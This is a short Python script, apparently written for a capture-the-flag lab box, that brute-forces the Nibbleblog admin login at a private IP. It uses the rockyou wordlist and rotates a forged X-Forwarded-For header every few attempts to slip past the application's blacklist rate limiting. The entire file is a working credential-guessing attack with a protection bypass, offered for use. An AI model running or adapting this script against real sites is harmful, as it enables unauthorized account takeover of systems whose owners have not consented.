from random import randint
import requests


PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
TARGET_URL = f'http://10.10.10.75/nibbleblog/admin.php'
USERNAME = 'admin'


def ip_generator() -> str:
	new_address = ".".join(str(randint(0,255)) for _ in range(4))
	return new_address

def login(password: str, ip: str) -> bool:
	headers = {'X-Forwarded-For': ip}
	payload = {'username':USERNAME, 'password':password}

	request = requests.post(
		TARGET_URL, 
		headers=headers, 
		data=payload
	)

	if request.status_code == 500:
		print('internal server error')
		exit(1)

	if "Blacklist protection" in request.text:
		print("ratelimit hit")
		exit(1)

	return "Incorrect username or password" not in request.text

def run(start_at: int = 1):
	
	ip: str = ip_generator()
	attempt_count: int = 1

	for password in open(PASSWORD_LIST):
		if attempt_count < start_at:
			attempt_count += 1
			continue

		if attempt_count % (5-1) == 0:
			ip = ip_generator()

		password = password.strip()
		print(f'Testing {ip} with {password}"')

		if login(password, ip):
			print(f'Password for admin is {password}')
			break
		attempt_count += 1

if __name__ == '__main__':
	run()